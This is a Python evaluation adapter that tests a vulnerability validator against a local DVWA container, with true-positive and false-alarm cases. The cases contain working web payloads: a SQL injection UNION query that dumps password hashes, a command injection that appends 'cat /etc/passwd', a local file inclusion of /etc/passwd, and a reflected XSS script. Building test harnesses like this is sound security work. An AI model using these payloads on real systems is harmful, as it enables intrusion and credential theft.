"""DVWA adapter: graded against a local DVWA fixed at 'low' security.

Known planted bugs (DVWA security=low) with documented oracles. We log in, set
security=low, and replay HTTP proofs through the generic HTTP harness. Reflected
XSS is graded as HTTP reflection (payload echoed unescaped) -- a weaker bar than
the browser-execution XSS harness, and flagged as such.

Local sandbox only; sends real payloads, so the dry-run gate is cleared for this
local target (global DRY_RUN stays on).
"""

from __future__ import annotations

import re
from urllib.parse import urlencode

import httpx

from ...config import Config
from ...scope import Platform, Target, TargetAuth
from ...validator.engine import Validator
from ...validator.models import Candidate, VulnClass
from .base import EvalCase, EvalResult, EvalTarget, grade

ADMIN_HASH = "5f4dcc3b5aa765d61d8327deb882cf99"  # md5("password"), leaked via UNION
PASSWD = "root:x:0:0"  # /etc/passwd first line
XSS = "<script>alert(1)</script>"


class DvwaTarget(EvalTarget):
    name = "dvwa"
    base_url = "http://localhost:4280"

    def docker_setup(self) -> str:
        return (
            "docker run -d --name dvwa -p 4280:80 ghcr.io/digininja/dvwa:latest\n"
            "# DVWA needs a MySQL/MariaDB. If the image ships none, install one in it:\n"
            "docker exec dvwa bash -c 'apt-get update && apt-get install -y mariadb-server "
            "&& service mariadb start'\n"
            'docker exec dvwa mysql -u root -e "CREATE DATABASE IF NOT EXISTS dvwa; '
            "CREATE USER IF NOT EXISTS 'dvwa'@'127.0.0.1' IDENTIFIED BY 'p@ssw0rd'; "
            "GRANT ALL ON dvwa.* TO 'dvwa'@'127.0.0.1'; FLUSH PRIVILEGES;\"\n"
            "# the adapter then logs in admin/password, runs setup.php create-db, "
            "and sets DVWA Security = Low automatically"
        )

    def _authenticate(self) -> str | None:
        """Log in, ensure the DB exists, set security=low; return a Cookie header."""

        def last_sid(resp) -> str | None:
            sids = [
                v.split(";")[0].split("=", 1)[1]
                for k, v in resp.headers.multi_items()
                if k.lower() == "set-cookie" and v.startswith("PHPSESSID=")
            ]
            return sids[-1] if sids else None

        def tok(text: str) -> str | None:
            m = re.search(r"user_token['\"]\s+value=['\"]([0-9a-f]{32})", text)
            return m.group(1) if m else None

        def ck(sid: str) -> dict:
            return {"Cookie": f"PHPSESSID={sid}"}

        try:
            cl = httpx.Client(base_url=self.base_url, timeout=20.0, follow_redirects=False)
            r = cl.get("/login.php")
            sid, t = last_sid(r), tok(r.text)
            if not (sid and t):
                return None
            r = cl.post(
                "/login.php",
                data={
                    "username": "admin",
                    "password": "password",
                    "Login": "Login",
                    "user_token": t,
                },
                headers=ck(sid),
            )
            sid = last_sid(r) or sid
            if "Logout" not in cl.get("/index.php", headers=ck(sid)).text:
                # DB not initialised yet: create it, then log in again.
                st = tok(cl.get("/setup.php", headers=ck(sid)).text)
                if st:
                    cl.post(
                        "/setup.php",
                        data={"create_db": "Create / Reset Database", "user_token": st},
                        headers=ck(sid),
                    )
                r = cl.get("/login.php")
                sid, t = last_sid(r) or sid, tok(r.text)
                r = cl.post(
                    "/login.php",
                    data={
                        "username": "admin",
                        "password": "password",
                        "Login": "Login",
                        "user_token": t,
                    },
                    headers=ck(sid),
                )
                sid = last_sid(r) or sid
                if "Logout" not in cl.get("/index.php", headers=ck(sid)).text:
                    return None
            st = tok(cl.get("/security.php", headers=ck(sid)).text)
            if st:
                cl.post(
                    "/security.php",
                    data={"security": "low", "seclev_submit": "Submit", "user_token": st},
                    headers=ck(sid),
                )
            return f"PHPSESSID={sid}; security=low"
        except Exception:  # noqa: BLE001 - any failure means "could not authenticate"
            return None

    def _cases(self, cookie: str) -> list[EvalCase]:
        b = self.base_url
        hdr = {"Cookie": cookie}
        contains = lambda v: {"type": "contains", "value": v}  # noqa: E731

        def get(cid, cls, title, path, oracle, vuln, category="supported", note=""):
            url = f"{b}{path}"
            return EvalCase(
                Candidate(
                    id=cid,
                    target_name="dvwa",
                    vuln_class=cls,
                    title=title,
                    url=url,
                    host="localhost",
                    params={
                        "requests": [{"method": "GET", "url": url, "headers": hdr}],
                        "oracle": oracle,
                    },
                ),
                vuln,
                category,
                note,
            )

        def post(cid, cls, title, path, form, oracle, vuln, category="supported", note=""):
            url = f"{b}{path}"
            headers = {**hdr, "Content-Type": "application/x-www-form-urlencoded"}
            return EvalCase(
                Candidate(
                    id=cid,
                    target_name="dvwa",
                    vuln_class=cls,
                    title=title,
                    url=url,
                    host="localhost",
                    params={
                        "requests": [
                            {
                                "method": "POST",
                                "url": url,
                                "headers": headers,
                                "body": urlencode(form),
                            }
                        ],
                        "oracle": oracle,
                    },
                ),
                vuln,
                category,
                note,
            )

        union = (
            "/vulnerabilities/sqli/?id='+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit"
        )
        return [
            # ---- true positives ----
            get(
                "dvwa-sqli-union",
                VulnClass.INJECTION,
                "SQLi UNION leaks password hashes",
                union,
                contains(ADMIN_HASH),
                True,
            ),
            post(
                "dvwa-cmdi",
                VulnClass.INJECTION,
                "Command injection reads /etc/passwd",
                "/vulnerabilities/exec/",
                {"ip": "127.0.0.1;cat /etc/passwd", "Submit": "Submit"},
                contains(PASSWD),
                True,
            ),
            get(
                "dvwa-lfi",
                VulnClass.OTHER,
                "Local file inclusion reads /etc/passwd",
                "/vulnerabilities/fi/?page=/etc/passwd",
                contains(PASSWD),
                True,
            ),
            get(
                "dvwa-xss-reflected",
                VulnClass.OTHER,
                "Reflected XSS (payload echoed unescaped)",
                "/vulnerabilities/xss_r/?name=<script>alert(1)</script>",
                contains(XSS),
                True,
                "reflection",
                "HTTP-reflection oracle (payload echoed unescaped); weaker than the "
                "browser-execution XSS harness",
            ),
            # ---- false alarms (expect REJECTED) ----
            get(
                "dvwa-sqli-benign",
                VulnClass.INJECTION,
                "Benign id=1 mislabelled SQLi dump",
                "/vulnerabilities/sqli/?id=1&Submit=Submit",
                contains(ADMIN_HASH),
                False,
            ),
            post(
                "dvwa-cmdi-benign",
                VulnClass.INJECTION,
                "Plain ping mislabelled command injection",
                "/vulnerabilities/exec/",
                {"ip": "127.0.0.1", "Submit": "Submit"},
                contains(PASSWD),
                False,
            ),
            get(
                "dvwa-lfi-benign",
                VulnClass.OTHER,
                "Normal include mislabelled LFI",
                "/vulnerabilities/fi/?page=file1.php",
                contains(PASSWD),
                False,
            ),
            get(
                "dvwa-xss-inert",
                VulnClass.OTHER,
                "Non-injected input mislabelled XSS",
                "/vulnerabilities/xss_r/?name=Bob",
                contains(XSS),
                False,
            ),
        ]

    def run(self, config: Config | None = None) -> EvalResult:
        if not self.available():
            return EvalResult(
                self.name, False, note="DVWA not reachable at :4280; run docker_setup"
            )
        cookie = self._authenticate()
        if not cookie:
            return EvalResult(self.name, False, note="DVWA login/DB-setup failed; see docker_setup")
        config = config or Config(dry_run=False)
        target = Target(
            name="dvwa",
            platform=Platform.SELF,
            safe_harbor_url="https://github.com/digininja/DVWA",
            in_scope=["localhost", "127.0.0.1"],
            dry_run=False,
            auth=TargetAuth(),
        )
        m, ms, rows = grade(self._cases(cookie), Validator(config), target)
        return EvalResult(self.name, True, m, ms, rows)
